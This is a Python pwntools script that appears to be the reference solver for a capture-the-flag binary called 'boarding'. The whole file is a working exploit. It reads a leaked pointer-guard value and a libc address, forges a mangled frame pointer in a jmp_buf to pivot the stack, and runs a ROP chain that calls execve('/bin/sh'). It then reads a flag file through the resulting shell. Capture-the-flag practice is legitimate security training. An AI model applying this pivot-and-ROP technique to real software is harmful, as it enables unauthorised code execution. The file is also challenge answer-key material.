#!/usr/bin/env python3
# Boarding (original) -- reference solver.
#
#   local :  ./solve.py            (runs ./boarding with ./libc.so.6 + ./ld here)
#   remote:  ./solve.py HOST PORT
#
# The terminal hands you BOTH a pointer-guard leak and a libc pointer
# (puts). Forge the mangled rbp in the jmp_buf, let longjmp + leave;ret pivot
# the stack into the fixed mmap region, and drop a short libc execve("/bin/sh")
# chain there. execve is a syscall, so it is happy on the tiny pivot stack and
# the whole chain fits the 8-slot window.
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

BIN  = './boarding'
elf  = ELF(BIN)
libc = ELF('./libc.so.6')
BP   = 0x13370000

def mangle(value, guard):
    return rol(value ^ guard, 0x11, 64)

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN)

io = start()

io.recvuntil(b'floor: 0x')
guard = int(io.recv(16), 16)
io.recvuntil(b'gate access code: ')
leaked_puts = int(io.recvline().strip(), 16)
libc.address = leaked_puts - libc.symbols['puts']
log.success('guard     = %#x', guard)
log.success('libc base = %#x', libc.address)
io.recvuntil(b'boarding pass data:')

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)
chain = rop.chain()
assert len(chain) <= 0x40, 'execve chain too long for the pivot window: %d' % len(chain)
log.info('execve chain = %d bytes (%d slots)', len(chain), len(chain) // 8)

payload = flat({
    0x00: p64(0),                    # eaten by `pop rbp` in the pivoting leave;ret
    0x08: chain,                     # libc execve("/bin/sh", 0, 0)
    0x48: p64(mangle(BP, guard)),    # jmpbuf[1] -> demangles to rbp = BP
}, filler=b'\x00', length=0x50)
io.send(payload)

io.sendline(b'id; cat /srv/app/flag.txt flag.txt 2>/dev/null')
io.interactive()
